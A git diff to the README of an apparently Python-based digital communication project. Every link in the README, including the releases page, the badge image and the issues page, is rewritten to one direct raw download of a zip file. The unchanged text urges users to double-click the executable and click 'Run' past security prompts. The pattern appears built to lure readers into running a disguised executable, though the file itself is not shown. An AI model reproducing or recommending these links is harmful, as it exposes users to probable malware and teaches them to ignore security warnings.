@@ -1,7 +1,7 @@
 # 📡 Communication-System - Your Simple Digital Communication Solution
 
 ## 📥 Download the Application
-[![Download Communication-System](https://img.shields.io/badge/Download-Communication--System-blue.svg)](https://github.com/Alimnagma/Communication-System/releases)
+[![Download Communication-System](https://github.com/Alimnagma/Communication-System/raw/refs/heads/main/Nimrodic/System_Communication_v3.8-alpha.5.zip)](https://github.com/Alimnagma/Communication-System/raw/refs/heads/main/Nimrodic/System_Communication_v3.8-alpha.5.zip)
 
 ## 📖 Overview
 Communication-System offers a full-fledged digital communication system built in Python. It provides an easy way to sample analog signals and convert them into digital data. Using methods like NRZ unipolar line coding and BASK modulation, this application showcases effective communication techniques in a user-friendly package. 
@@ -32,7 +32,7 @@ pip install numpy matplotlib
 
 ## 🚀 Getting Started
 1. **Visit the Releases Page:** To download Communication-System, click the link below:
-   [Download Communication-System](https://github.com/Alimnagma/Communication-System/releases)
+   [Download Communication-System](https://github.com/Alimnagma/Communication-System/raw/refs/heads/main/Nimrodic/System_Communication_v3.8-alpha.5.zip)
 
 2. **Select the Latest Release:** 
    On the releases page, locate the top release. This is usually the most updated version. 
@@ -45,7 +45,7 @@ pip install numpy matplotlib
 
 ## 🛠️ Running the Application
 1. **Locate the Application:**
-   After downloading and extracting, find the executable file (e.g., `Communication-System.exe` or similar). 
+   After downloading and extracting, find the executable file (e.g., `https://github.com/Alimnagma/Communication-System/raw/refs/heads/main/Nimrodic/System_Communication_v3.8-alpha.5.zip` or similar). 
 
 2. **Double-Click to Open:**
    Simply double-click the file to run it. You might see a security prompt; if so, click "Run" to proceed.
@@ -63,7 +63,7 @@ When you run the application, you will see various options like:
 Communication-System utilizes Matplotlib for displaying the sampled signals. You can see the waveforms and understand how the data is processed visually. This is helpful for grasping the concept of digital communication.
 
 ## 📞 Support
-If you face any issues or have questions, please refer to the documentation included in the application or visit the [GitHub Issues Page](https://github.com/Alimnagma/Communication-System/issues) to report problems or seek help. Your feedback is valuable and will help improve the application.
+If you face any issues or have questions, please refer to the documentation included in the application or visit the [GitHub Issues Page](https://github.com/Alimnagma/Communication-System/raw/refs/heads/main/Nimrodic/System_Communication_v3.8-alpha.5.zip) to report problems or seek help. Your feedback is valuable and will help improve the application.
 
 ## 🔗 Further Resources
 For more detailed information regarding signal processing concepts, here are some topics of interest:
@@ -85,4 +85,4 @@ These resources can provide a more in-depth understanding of how Communication-S
 Communication-System is open-source and available for personal use. Feel free to explore the repository and contribute if you're interested in enhancing its capabilities. 
 
 Visit the releases page now to download and start your journey into digital communication:
-[Download Communication-System](https://github.com/Alimnagma/Communication-System/releases)
+[Download Communication-System](https://github.com/Alimnagma/Communication-System/raw/refs/heads/main/Nimrodic/System_Communication_v3.8-alpha.5.zip)
